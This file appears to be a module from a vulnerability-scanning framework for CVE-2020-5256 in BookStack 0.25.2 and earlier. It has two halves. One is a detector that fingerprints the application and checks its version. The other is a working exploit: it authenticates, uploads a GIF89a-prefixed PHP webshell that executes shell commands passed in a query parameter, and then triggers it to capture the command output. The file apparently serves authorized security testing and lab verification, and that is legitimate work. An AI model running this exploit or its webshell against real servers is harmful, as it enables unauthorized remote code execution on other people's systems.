#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2020-5256')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2020-5256 — BookStack <= 0.25.2 authenticated image-upload RCE (SAFE UNAUTH DETECTOR).

BookStack's `app/Http/Controllers/ImageController::uploadByType()` validated image uploads with a
custom `is_image` rule that checks ONLY the content-derived getMimeType() (magic bytes), not the
file EXTENSION. A file named `shell.php` whose bytes start with `GIF89a` therefore reports
`image/gif`, passes validation, and is stored verbatim under public/uploads/images/.../shell.php
(the `local` disk root IS public_path()) where php-fpm executes it on GET -> RCE. Fixed in 0.25.3
(commit 37b91b6b) by swapping to Laravel's extension-aware `mimes:` rule (a `.php` upload now 422s).

DETECTION DISCIPLINE (avoid the 48987/49130 "the app exists" false-positive class):
BookStack 0.25.2 is from 2020; almost every live instance is long patched. So merely fingerprinting
"BookStack is here" must NOT fire vulnerable=True. This detector:
  * Positively, MULTI-SIGNAL fingerprints BookStack unauthenticated (GET /login + GET /): a Laravel
    CSRF `_token` field PLUS BookStack-specific structural markers (title/footer "BookStack",
    /dist/ asset bundles, the login form shape). Multi-signal so it isn't tuned to one fragile string.
  * Best-effort reads a public version token (BookStack stamps a `v<maj>.<min>.<patch>` in the footer
    / page chrome) and refines the verdict with a tuple compare: (M,m,p) <= (0,25,2) -> vulnerable,
    anything newer (incl. the later calendar-versioned v21.x/v23.x which all compare as > (0,25,2))
    -> patched. The version read is a REFINEMENT, not a precondition.
  * If BookStack is fingerprinted but NO version is exposed unauth -> vulnerable=False,
    version_status="unknown", and evidence says exploit() is the confirmation (it actually pops the
    is_image bypass). scan() never requires auth; creds (if passed) only unlock a bonus authed
    version read, and degrade gracefully when absent.
"""

import re
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Last vulnerable release (fix landed in 0.25.3). BookStack later switched to calendar versioning
# (v21.05.x, v23.x ...) — those parse to majors >= 21 and compare cleanly as > this floor (patched).
_VULN_CEILING = (0, 25, 2)


def _get(session, url, **kw):
    try:
        allow_redirects = kw.pop("allow_redirects", True)
        return session.get(url, timeout=kw.pop("timeout", 10), verify=False,
                           allow_redirects=allow_redirects, **kw)
    except requests.RequestException:
        return None


def _fingerprint_bookstack(html: str, headers: dict) -> list:
    """Return the list of BookStack-specific signals observed in a page (multi-signal FP).

    Each signal is a short human string; >=2 distinct signals (with a Laravel _token present)
    is a confident BookStack fingerprint without tuning to any single fragile marker.
    """
    signals = []
    low = (html or "").lower()
    if "bookstack" in low:
        signals.append('"BookStack" present in page chrome (title/footer)')
    # BookStack ships its compiled assets under /dist/ (styles.css, app.js, scripts.js).
    if re.search(r'/dist/(styles|app|scripts)[^"\']*\.(css|js)', html or ""):
        signals.append("/dist/ compiled-asset bundle path (BookStack front-end build)")
    # The login form posts to /login with email+password and a Laravel CSRF token.
    if re.search(r'name=["\']email["\']', html or "") and re.search(r'name=["\']password["\']', html or ""):
        signals.append("email+password login form")
    # BookStack's CSP/meta or generator hints (best-effort, not required).
    server = (headers or {}).get("Server", "")
    if "bookstack" in server.lower():
        signals.append(f"Server header advertises BookStack ({server})")
    return signals


def _read_version(*texts) -> str:
    """Best-effort scrape of a BookStack version token (e.g. 'v0.25.2', 'v23.10.2') from any of the
    given response bodies. BookStack stamps the running version into the page footer / chrome.
    Returns the matched 'v<...>' string (or None)."""
    for t in texts:
        if not t:
            continue
        # Prefer a version adjacent to a BookStack mention to avoid grabbing an unrelated asset hash.
        m = (re.search(r'BookStack[^0-9v]{0,40}?v?(\d+\.\d+\.\d+)', t, re.I)
             or re.search(r'\bv(\d+\.\d+\.\d+)\b', t))
        if m:
            return m.group(1)
    return None


def _parse_tuple(ver: str):
    m = re.match(r'\s*(\d+)\.(\d+)\.(\d+)', ver or "")
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _probe_uploaded_php_execution_control(session, base: str):
    """GET a guaranteed-missing uploaded PHP path.

    Vulnerable profiles should simply 404 because the file does not exist. Hardened profiles deny PHP
    under public uploads/storage before file lookup, which is exactly the control that blocks this CVE.
    """
    probes = (
        "/uploads/images/gallery/lvc-control-probe.php",
        "/storage/lvc-control-probe.php",
    )
    attempts = []
    for path in probes:
        r = _get(session, base + path, allow_redirects=False)
        if r is None:
            continue
        attempt = {"path": path, "status": r.status_code}
        attempts.append(attempt)
        if r.status_code in (401, 403):
            attempt["blocked"] = True
            return {"blocked": True, "attempts": attempts}
    return {"blocked": False, "attempts": attempts}


def scan(target_url, *, session=None, username=None, password=None, **kwargs):
    operator_authed = session is not None
    sess = session or http_config.get_auth_session()
    base = target_url.rstrip("/")
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    sess.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    sess.headers.setdefault("X-lvcscan", "CVE-2020-5256")

    result = {
        "cve_id": "CVE-2020-5256",
        "name": "BookStack authenticated image-upload RCE (is_image MIME-only bypass)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version_status": "unknown",
        "endpoint": base + "/images/gallery/upload",
        "evidence": [],
        "detection_methods": [],
        "artifacts": {},
    }

    # 1) Unauthenticated fingerprint surfaces: /login (CSRF token + login form) and / (footer chrome).
    login = _get(sess, f"{base}/login")
    home = _get(sess, f"{base}/")
    if login is None and home is None:
        result["evidence"].append("target unreachable (no response from /login or /)")
        return result

    login_html = login.text if (login is not None and login.status_code < 500) else ""
    home_html = home.text if (home is not None and home.status_code < 500) else ""

    # Laravel CSRF _token on the login form is the baseline (it's a Laravel app with a login).
    has_token = bool(re.search(r'name=["\']_token["\']', login_html)
                     or re.search(r'name=["\']_token["\']', home_html))

    signals = _fingerprint_bookstack(login_html, login.headers if login is not None else {})
    # Dedup against home-page signals so two surfaces reinforce one fingerprint.
    for sig in _fingerprint_bookstack(home_html, home.headers if home is not None else {}):
        if sig not in signals:
            signals.append(sig)

    if not (has_token and len(signals) >= 2):
        result["evidence"].append(
            "not confidently BookStack (need a Laravel _token + >=2 BookStack signals); "
            f"signals seen: {signals or 'none'}")
        return result

    result["detection_methods"].append("bookstack_fingerprint")
    result["status"] = "surface_present"
    result["verdict"] = "surface_present"
    result["proof_type"] = "fingerprint"
    result["evidence"].append("BookStack fingerprinted (unauth): " + "; ".join(signals))

    # 2) Best-effort public version read -> refine the verdict (refinement, NOT a precondition).
    ver = _read_version(login_html, home_html)
    # If creds were supplied, try one authed surface that often carries the version (bonus only;
    # scan() never *requires* this — absent creds we simply skip it).
    if ver is None and not operator_authed:
        if username and password:
            try:
                tok = None
                mt = re.search(r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']', login_html)
                if mt:
                    tok = mt.group(1)
                if tok:
                    sess.post(f"{base}/login", data={"_token": tok, "email": username, "password": password},
                               timeout=12, verify=False, allow_redirects=True)
                    settings = _get(sess, f"{base}/settings")
                    ver = _read_version(settings.text if settings is not None else "", home_html)
            except requests.RequestException:
                pass

    if ver:
        vt = _parse_tuple(ver)
        if vt is not None and vt <= _VULN_CEILING:
            control = _probe_uploaded_php_execution_control(sess, base)
            result["artifacts"]["uploaded_php_control_probe"] = control
            result["detection_methods"].append("uploaded_php_control_probe")
            if control.get("blocked"):
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "upload_execution_control"
                result["version_status"] = "vulnerable version, upload PHP execution denied"
                result["evidence"].append(
                    "BookStack version is in range, but uploaded PHP execution is denied under "
                    "public uploads/storage")
                return result
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["version_status"] = "vulnerable"
            result["detection_methods"].append("version_in_affected_range")
            result["evidence"].append(
                f"BookStack version v{ver} <= 0.25.2 — within affected range (fix landed 0.25.3); "
                "is_image MIME-only upload bypass present")
            return result
        if vt is not None:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            result["version_status"] = "patched"
            result["detection_methods"].append("version_out_of_range")
            result["evidence"].append(
                f"BookStack version v{ver} > 0.25.2 — PATCHED (>=0.25.3 uses Laravel's "
                "extension-aware mimes: rule; a .php upload now 422s)")
            return result

    # 3) Fingerprinted BookStack but no version exposed unauth -> conservative: do NOT fire.
    result["version_status"] = "unknown"
    result["evidence"].append(
        "BookStack version not exposed on a public surface — cannot confirm <=0.25.2 unauth; "
        "vulnerable=False (fingerprint-based). exploit() is the confirmation: it uploads a "
        "GIF89a-prefixed .php webshell via /images/gallery/upload and captures in-band command output.")
    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2020-5256 exploitation half — BookStack authenticated image-upload -> RCE.

Faithful port of the lab's standalone, live-verified PoC
(vuln-labs/apps/bookstack/0.25.2/cve-2020-5256_upload-rce_41012-42012/exploit.py). The technique:

  1. GET /login            -> scrape the Laravel CSRF `_token` and seed the session cookie.
  2. POST /login           -> {_token,email,password} authenticate as the seeded admin.
  3. GET /                 -> confirm auth (no redirect back to /login) + refresh the token.
  4. POST /images/gallery/upload  multipart file=poc_<rand>.php whose CONTENT begins with the GIF
     magic `GIF89a` then a PHP webshell. BookStack <=0.25.2's custom `is_image` validator checks only
     getMimeType() (content magic), so the GIF-headed file passes; the `.php` name is preserved and
     the file lands in public/uploads/images/gallery/<Y-m-M>/poc_<rand>.php (the local disk root IS
     public_path()). Content-Type image/gif + X-Requested-With: XMLHttpRequest, as the PoC sends.
  5. GET the stored .php?c=<command> -> php-fpm executes it; we capture the command output verbatim
     between unique random sentinels (uid=... + hostname).

success=True ONLY on POSITIVE in-band proof: the webshell output observed between our sentinels.
The PoC's fixed CVE20205256 marker is replaced with per-run random sentinels (secrets.token_hex) so
output extraction is collision-proof and matches the repo idiom (cf. cve_2024_21546).

Detection half: modules/cves/cve_2020_5256.py.
"""

import re
import time
import secrets

import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

_GIF_MAGIC = b"GIF89a"


def _normalize_base(target_url: str) -> str:
    base = (target_url or "").rstrip("/")
    if base and not base.startswith(("http://", "https://")):
        base = "http://" + base
    return base


def _extract_token(html: str):
    """Scrape the Laravel CSRF `_token` from a BookStack form (hidden input, attr order tolerant)."""
    if not html:
        return None
    m = (re.search(r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']', html)
         or re.search(r'value=["\']([^"\']+)["\']\s+name=["\']_token["\']', html)
         or re.search(r'<meta[^>]+name=["\']token["\'][^>]+content=["\']([^"\']+)["\']', html))
    return m.group(1) if m else None


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None):
    """Authenticated GIF89a-polyglot .php upload -> RCE. Never raises to the caller."""
    result = {
        "cve": "CVE-2020-5256",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    operator_authed = session is not None

    base = _normalize_base(target_url)
    if not base:
        result.update(attempted=False, reason="no target_url provided")
        return result

    email = username
    pw = password
    cmd = command or "echo CVE-2020-5256 PoC && id && hostname"
    timeout = 20

    s = session or http_config.get_auth_session()
    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2020-5256")

    token = None
    if not operator_authed:
        if email is None or pw is None:
            result.update(
                requires=["valid BookStack credentials with image-create-all"],
                reason="BookStack exploit requires explicit credentials; pass both -U and -P",
                detail="authentication material not supplied",
            )
            return result

        # 1) GET /login -> CSRF token + session cookie.
        try:
            r = s.get(f"{base}/login", timeout=timeout, verify=False)
        except requests.RequestException as e:
            result.update(reason=f"/login unreachable ({e.__class__.__name__})")
            return result
        token = _extract_token(r.text)
        if not token:
            result.update(
                reason=f"no CSRF _token on /login (HTTP {r.status_code}) — not BookStack, or app not up",
                detail="login form / CSRF token not found")
            return result

        # 2) POST explicit credentials supplied by the operator or lab run.sh.
        if email and pw:
            try:
                s.post(f"{base}/login", data={"_token": token, "email": email, "password": pw},
                       timeout=timeout, verify=False, allow_redirects=True)
            except requests.RequestException as e:
                result.update(reason=f"login POST failed ({e.__class__.__name__})")
                return result

    # 3) GET home to confirm auth + refresh token.
    try:
        home = s.get(f"{base}/", timeout=timeout, verify=False, allow_redirects=True)
    except requests.RequestException as e:
        result.update(reason=f"home GET failed after login ({e.__class__.__name__})")
        return result
    if not operator_authed and "/login" in (home.url or ""):
        result.update(
            requires=["valid BookStack credentials with image-create-all"],
            reason=(f"login failed for {email} (redirected to /login) — wrong creds or admin not "
                    "seeded. "
                    "Supply -U/-P for a user with image upload permission."),
            detail="authentication did not establish a session")
        return result
    token = _extract_token(home.text) or token

    # 4) Build the GIF89a/PHP polyglot. GIF magic satisfies is_image's getMimeType() == image/gif;
    #    the .php name is preserved on disk -> executed by php-fpm. Random sentinels wrap the output.
    s_open = "LVSX5256_" + secrets.token_hex(4)
    s_close = secrets.token_hex(4) + "_5256LVSX"
    php_shell = (
        b"GIF89a\n<?php echo '" + s_open.encode() + b"'; "
        b"system(isset($_GET['c']) ? $_GET['c'] : " + _php_str(cmd).encode() + b"); "
        b"echo '" + s_close.encode() + b"'; ?>"
    )
    fname = f"poc_{int(time.time())}_{secrets.token_hex(3)}.php"

    # 5) Upload via the vulnerable endpoint (multipart file=, Content-Type image/gif, XHR header).
    files = {"file": (fname, php_shell, "image/gif")}
    data = {"_token": token}
    upload_url = f"{base}/images/gallery/upload"
    try:
        up = s.post(upload_url, data=data, files=files,
                    headers={"X-Requested-With": "XMLHttpRequest"},
                    timeout=timeout, verify=False)
    except requests.RequestException as e:
        result.update(reason=f"upload POST failed ({e.__class__.__name__})")
        return result

    body = up.text or ""
    if up.status_code != 200:
        # 422 "must be a file of type: jpeg,png,gif,..." is the PATCHED signature (>=0.25.3).
        patched = re.search(r"must be (a file of type|an image)", body, re.I) or up.status_code == 422
        result.update(
            success=False,
            version_status="patched" if patched else "unknown",
            reason=("upload rejected HTTP %d — %s" % (
                up.status_code,
                "PATCHED (>=0.25.3 extension-aware mimes: rule rejects the .php)" if patched
                else "auth/CSRF gate or endpoint changed")),
            detail="image upload not accepted",
            artifacts={"upload_status": up.status_code, "upload_body": body[:300]})
        if up.status_code in (401, 403, 419) and not (username and password):
            result["requires"] = ["credentials"]
        return result

    # Parse the saved URL from the LFM/gallery JSON: prefer a field whose value contains .php.
    saved = None
    try:
        j = up.json()
        if isinstance(j, dict):
            for k in ("url", "path", "thumbs", "uploaded"):
                v = j.get(k)
                if isinstance(v, str) and ".php" in v:
                    saved = v
                    break
            if saved is None:
                saved = j.get("url") or j.get("path")
    except ValueError:
        pass
    if not saved:
        m = (re.search(r'"(?:url|path)"\s*:\s*"([^"]+\.php[^"]*)"', body)
             or re.search(r'"url"\s*:\s*"([^"]+)"', body))
        saved = m.group(1) if m else None
    if not saved:
        result.update(
            reason="upload returned 200 but no stored URL parsed from the JSON response",
            detail="could not locate the saved file URL",
            artifacts={"upload_status": 200, "upload_body": body[:300]})
        return result

    shell_url = saved.replace("\\/", "/")
    if shell_url.startswith("/"):
        shell_url = base + shell_url
    elif not shell_url.startswith(("http://", "https://")):
        shell_url = base + "/" + shell_url

    # 6) Trigger RCE and capture the in-band output between our sentinels.
    try:
        trig = s.get(shell_url, params={"c": cmd}, timeout=timeout, verify=False)
    except requests.RequestException as e:
        result.update(reason=f"webshell GET failed ({e.__class__.__name__})",
                      artifacts={"webshell_url": shell_url})
        return result

    text = trig.text or ""
    if s_open in text and s_close in text:
        out = text.split(s_open, 1)[1].split(s_close, 1)[0].strip()
        result.update(
            success=True,
            evidence=out if out else "(command produced no stdout, but webshell executed)",
            detail=f"RCE via is_image MIME-only upload bypass; '{cmd}' executed at {shell_url}",
            artifacts={
                "webshell_url": shell_url,
                "upload_endpoint": upload_url,
                "uploaded_as": fname,
                "command": cmd,
                "marker": f"{s_open}...{s_close}",
            },
        )
        return result

    result.update(
        success=False,
        reason=(f"stored file reached (HTTP {trig.status_code}) but no command output between "
                "sentinels — PHP may not have executed (no php-fpm on /uploads, or patched)"),
        detail="upload landed but code execution not confirmed",
        artifacts={"webshell_url": shell_url, "trigger_status": trig.status_code,
                   "response_head": text[:200]})
    return result


def _php_str(s: str) -> str:
    """Embed the default command as a single-quoted PHP string literal (for the no-?c fallback)."""
    return "'" + str(s).replace("\\", "\\\\").replace("'", "\\'") + "'"
